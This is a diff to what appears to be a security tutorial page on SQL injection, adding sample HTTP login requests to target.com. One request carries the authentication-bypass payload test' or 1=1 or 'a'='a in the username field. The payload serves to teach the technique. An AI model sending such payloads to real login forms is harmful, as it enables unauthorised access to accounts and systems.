@@ -11,6 +11,14 @@
 {% stepper %}
 {% step %}
 Log in to the target site and complete the authentication process on the site
+
+```http
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+UserName=testuser&Password=test
+```
 {% endstep %}
 
 {% step %}
@@ -38,6 +46,16 @@ In the username field, inject the following malicious payload
 
 ```sql
 test' or 1=1 or 'a'='a
+```
+
+The payload has been injected
+
+```http
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+UserName=test' or 1=1 or 'a'='a&Password=test
 ```
 {% endstep %}
 
